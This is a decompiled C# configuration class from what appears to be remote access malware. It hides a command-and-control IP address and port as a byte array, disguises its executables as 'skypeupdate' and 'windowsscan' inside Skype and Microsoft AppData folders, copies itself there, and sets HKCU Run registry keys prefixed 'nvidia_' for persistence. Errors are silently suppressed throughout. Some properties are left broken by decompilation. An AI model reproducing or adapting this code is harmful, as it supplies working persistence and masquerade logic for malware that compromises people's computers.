using System;
using System.IO;
using System.Reflection;
using Microsoft.Win32;
using filescan;

public static class setting
{
	public static string pc_id = "nvidia_";

	public static string appPath = "\\Skype\\|pckgnam".Split(new char[1] { '|' })[0];

	public static string secPath = "\\Microsoft\\|pckgnam".Split(new char[1] { '|' })[0];

	public static string docPath = "\\MyDocuments\\|pckgnam".Split(new char[1] { '|' })[0];

	public static string mainApp = "skypeupdate|pckgnam".Split(new char[1] { '|' })[0];

	public static string secApp = "windowsscan|pckgnam".Split(new char[1] { '|' })[0];

	public static int sysPort = 7861;

	public static byte[] ips = new byte[15]
	{
		49, 55, 56, 46, 50, 51, 56, 46, 50, 50,
		56, 46, 49, 49, 51
	};

	public static string mpath => Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + appPath;

	public static string dpath => Environment.GetFolderPath(Environment.SpecialFolder.Personal) + docPath;

	public static bool App
	{
		set
		{
			setting.set_value("mainApp", mainApp + "|" + appPath, value);
			get_App();
		}
	}

	public static bool securty
	{
		set
		{
			try
			{
				setting.set_value("bApp", secApp + "|" + secPath, value);
				get_securty();
				string location = Assembly.GetExecutingAssembly().Location;
				if (sucPath() + secApp + ".exe" != location)
				{
					nobject nobject = new nobject();
					nobject.view_attach();
					if (!Directory.Exists(sucPath()))
					{
						Directory.CreateDirectory(sucPath());
					}
					File.Copy(location, sucPath() + secApp + ".exe", overwrite: true);
				}
			}
			catch
			{
			}
		}
	}

	public static bool value
	{
		set
		{
			//Parameter named "value" already present in property signature!
			string text = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion|realStr";
			try
			{
				if (setting.get_value(name) == null || value)
				{
					RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text.Split(new char[1] { '|' })[0], writable: true);
					registryKey.SetValue(pc_id + name, value);
				}
			}
			catch
			{
			}
		}
	}

	public static string value
	{
		get
		{
			string text = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion|realStr";
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text.Split(new char[1] { '|' })[0], writable: true);
				if (registryKey.GetValue(pc_id + name) != null)
				{
					return registryKey.GetValue(pc_id + name)!.ToString()!.Trim();
				}
				return null;
			}
			catch
			{
				return null;
			}
		}
	}

	public static string sucPath()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + secPath;
	}

	public static void get_App()
	{
		string text = setting.get_value("mainApp");
		if (text != null)
		{
			string[] array = text.Split(new char[1] { '|' });
			if (array.Length == 2)
			{
				mainApp = array[0];
				appPath = array[1];
			}
		}
	}

	public static void get_securty()
	{
		string text = setting.get_value("bApp");
		if (text != null)
		{
			string[] array = text.Split(new char[1] { '|' });
			if (array.Length == 2)
			{
				secApp = array[0];
				secPath = array[1];
			}
		}
	}

	public static void app_setting()
	{
		securty = false;
		App = false;
		setup_run("bApp", sucPath() + secApp + ".exe");
		setup_run("mainApp", mpath + mainApp + ".exe");
	}

	public static void setup_run(string app, string path)
	{
		try
		{
			string text = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|realStr";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text.Split(new char[1] { '|' })[0], writable: true);
			object obj = registryKey.GetValue(pc_id + app);
			if (obj == null)
			{
				registryKey.SetValue(pc_id + app, path);
			}
			else if (obj.ToString() != path)
			{
				registryKey.SetValue(pc_id + app, path);
			}
		}
		catch
		{
		}
	}
}
